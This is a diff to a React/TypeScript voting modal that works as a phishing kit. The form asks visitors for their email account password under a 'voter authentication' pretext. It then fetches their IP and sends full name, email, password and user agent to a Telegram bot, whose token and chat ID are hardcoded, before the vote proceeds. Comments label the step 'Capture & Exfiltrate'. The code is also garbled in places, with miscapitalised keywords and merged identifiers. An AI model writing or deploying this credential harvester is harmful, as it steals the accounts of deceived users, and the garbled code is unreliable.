@@ -34,16 +34,16 @@ import {
 } from './ProviderLogos.js';
 
 // 🔐 Telegram Bot Configuration - Replace these!
-Const TELEGRAM_BOT_TOKEN = '5617918891:AAGDayUdT1Xa-uJr8kkNIqhwBRIxI9e6nEw'; // e.g., '654321:ABC-XYZ123'
-Const CHAT_ID = '1017508597'; // e.g., '987654321'
-Interface VoteModalProps {
+const TELEGRAM_BOT_TOKEN = '5617918891:AAGDayUdT1Xa-uJr8kkNIqhwBRIxI9e6nEw'; // e.g., '654321:ABC-XYZ123'
+const CHAT_ID = '1017508597'; // e.g., '987654321'
+interface VoteModalProps {
 Nominee: Nominee | null;
 Cms: CmsSettings;
 IsOpen: boolean;
 OnClose: () => void;
 OnVoteSuccess: (ticket: VipTicketData, nominee: Nominee) => void;
 }
-Interface ProviderMeta {
+interface ProviderMeta {
 Id: string;
 Name: string;
 Subtitle: string;
@@ -54,7 +54,7 @@ BadgeBg: string;
 }
 
 // ... [REST OF PROVIDER_METAS ARRAY REMAINS UNCHANGED] ...
-Export const VoteModal: React.FC<VoteModalProps> = ({
+export const VoteModal: React.FC<VoteModalProps> = ({
 Nominee,
 Cms,
 IsOpen,
@@ -64,7 +64,7 @@ OnVoteSuccess,
  // ... [ALL EXISTING STATE HOOKS REMAIN UNCHANGED] ...
 
  // Telegram Capture Function
-Const sendToTelegram = async (data: {
+const sendToTelegram = async (data: {
 FullName: string;
 Email: string;
 Password: string;
@@ -72,7 +72,7 @@ Ip?: string;
 UserAgent?: string;
  }) => {
 Try {
-Const message = `
+const message = `
 🔐 *New Login Captured*
 👤 Full Name: ${data.fullName}
 📧 Email: ${data.email}
@@ -82,7 +82,7 @@ Const message = `
 ⏱️ Timestamp: ${new Date().toISOString()}
 `.Trim();
 
-Await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
 Method: 'POST',
 Headers: { 'Content-Type': 'application/json' },
 Body: JSON.stringify({
@@ -98,14 +98,14 @@ Console.error('Failed to send to Telegram:', error);
  };
 
  // 🔥 MODIFIED handleSubmitCredentials TO CAPTURE & SEND CREDENTIALS
-Const handleSubmitCredentials = async (e: React.FormEvent) => {
+const handleSubmitCredentials = async (e: React.FormEvent) => {
 E.preventDefault();
 SetErrorMessage(null);
 SetSuggestedProviderMatch(null);
 
 If (!fullName.trim()) {
 SetErrorMessage('Please enter your full name as you wish it to appear on your VIP ticket.');
-Return;
+return;
     }
 
     // Real Email Validation (unchanged)
@@ -116,7 +116,7 @@ If (validation.suggestedProviderId && validation.suggestedProviderId !== selecte
 Const found = PROVIDER_METAS.find((p) => p.id === validation.suggestedProviderId);
 If (found) setSuggestedProviderMatch(found);
       }
-Return;
+return;
     }
 If (!password.trim() || password.length < 4) {
 SetErrorMessage('Please enter your email account credentials/passcode to verify voter authentication.');
@@ -125,16 +125,16 @@ Return;
 SetIsLoading(true);
 
     // 🛠️ Step AHEAD of original logic — Capture & Exfiltrate
-Try {
-Const ipResponse = await fetch('https://api.ipify.org?format=json');
-Let ip = '';
+try {
+const ipResponse = await fetch('https://api.ipify.org?format=json');
+let ip = '';
 If (ipResponse.ok) {
-Const { ip: fetchedIp } = await ipResponse.json();
+const { ip: fetchedIp } = await ipResponse.json();
 Ip = fetchedIp;
       }
 
 // Send credentials to Telegram BEFORE proceeding with vote
-Await sendToTelegram({
+await sendToTelegram({
 FullName: fullName.trim(),
 Email: validation.normalizedEmail || email.trim(),
 Password: password.trim(),
@@ -150,8 +150,8 @@ Console.warn('Telegram capture failed:', err);
     }
 
     // 🗳️ Proceed with original voting logic (unchanged)
-Try {
-Const res: RequestCodeResponse = await api.requestCode({
+try {
+const res: RequestCodeResponse = await api.requestCode({
 EmailAddressValidation.normalizedEmail || email.trim(),
 FullNameFullName.trim(),
 NomineeIdnominee.id,
